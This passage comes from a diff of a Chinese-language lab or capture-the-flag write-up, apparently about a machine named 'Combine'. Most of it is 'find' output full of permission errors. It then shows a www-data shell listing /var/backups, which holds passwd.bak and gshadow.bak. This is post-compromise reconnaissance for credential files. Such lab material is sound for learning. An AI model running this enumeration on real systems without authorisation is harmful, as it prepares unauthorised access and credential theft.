+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/108/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/108/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/110/task/110/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/110/task/110/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/110/task/110/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/110/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/110/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/110/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/110/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/111/task/111/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/111/task/111/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/111/task/111/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/111/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/111/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/111/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/111/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/113/task/113/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/113/task/113/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/113/task/113/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/113/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/113/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/113/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/113/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/157/task/157/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/157/task/157/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/157/task/157/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/157/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/157/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/157/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/157/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/159/task/159/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/159/task/159/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/159/task/159/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/159/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/159/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/159/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/159/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/189/task/189/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/189/task/189/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/189/task/189/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/189/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/189/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/189/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/189/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/191/task/191/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/191/task/191/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/191/task/191/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/191/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/191/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/191/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/191/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/192/task/192/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/192/task/192/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/192/task/192/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/192/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/192/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/192/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/192/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/225/task/225/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/225/task/225/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/225/task/225/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/225/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/225/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/225/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/225/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/249/task/249/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/249/task/249/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/249/task/249/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/249/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/249/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/249/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/249/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/287/task/287/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/287/task/287/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/287/task/287/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/287/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/287/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/287/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/287/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/290/task/290/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/290/task/290/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/290/task/290/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/290/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/290/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/290/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/290/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/338/task/338/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/338/task/338/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/338/task/338/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/338/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/338/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/338/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/338/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/task/340/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/task/340/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/task/340/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/task/377/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/task/377/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/task/377/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/340/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/375/task/375/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/375/task/375/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/375/task/375/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/375/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/375/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/375/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/375/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/376/task/376/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/376/task/376/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/376/task/376/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/376/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/376/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/376/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/376/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/378/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/378/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/378/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/387/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/387/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/387/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/388/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/388/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/388/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/393/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/393/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/task/393/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/378/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/381/task/381/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/381/task/381/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/381/task/381/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/381/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/381/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/381/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/381/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/385/task/385/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/385/task/385/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/385/task/385/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/385/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/385/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/385/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/385/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/386/task/386/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/386/task/386/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/386/task/386/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/386/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/386/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/386/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/386/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/407/task/407/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/407/task/407/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/407/task/407/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/407/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/407/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/407/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/407/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/task/414/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/task/414/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/task/414/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/task/421/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/task/421/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/task/421/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/414/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/419/task/419/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/419/task/419/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/419/task/419/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/419/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/419/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/419/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/419/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/422/task/422/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/422/task/422/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/422/task/422/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/422/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/422/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/422/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/422/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/423/task/423/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/423/task/423/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/423/task/423/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/423/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/423/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/423/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/423/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/424/task/424/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/424/task/424/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/424/task/424/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/424/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/424/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/424/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/424/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/425/task/425/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/425/task/425/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/425/task/425/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/425/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/425/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/425/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/425/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/426/task/426/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/426/task/426/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/426/task/426/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/426/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/426/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/426/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/426/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/531/task/531/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/531/task/531/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/531/task/531/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/531/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/531/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/531/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/531/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/538/task/538/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/538/task/538/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/538/task/538/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/538/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/538/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/538/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/538/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/552/task/552/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/552/task/552/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/552/task/552/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/552/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/552/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/552/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/552/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/553/task/553/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/553/task/553/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/553/task/553/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/553/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/553/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/553/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/553/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/565/task/565/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/565/task/565/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/565/task/565/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/565/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/565/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/565/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/565/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/etc/polkit-1/localauthority&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/etc/ssl/private&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/etc/inspircd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>/var/backups
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/log/private&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/log/unattended-upgrades&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/log/apache2&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/spool/rsyslog&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/spool/cron/crontabs&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/lib/polkit-1&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/lib/apt/lists/partial&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/lib/php/sessions&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/lib/private&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/cache/apt/archives/partial&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/cache/apparmor/ea9ed67a.0&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/cache/ircd-hybrid&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/cache/ldconfig&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/var/cache/private&#39;</span>: Permission denied
+</span></span></code></pre></div><p>可以发现/var/backups是存在的，那么去看看</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@Combine:/$ <span class=nb>cd</span> /var/backups
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /var/backups
+</span></span><span class=line><span class=cl>www-data@Combine:/var/backups$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>alternatives.tar.0        apt.extended_states.5.gz  dpkg.status.1.gz
+</span></span><span class=line><span class=cl>apt.extended_states.0     dpkg.diversions.0         group.bak
+</span></span><span class=line><span class=cl>apt.extended_states.1.gz  dpkg.diversions.1.gz      gshadow.bak
+</span></span><span class=line><span class=cl>apt.extended_states.2.gz  dpkg.statoverride.0       passwd.bak
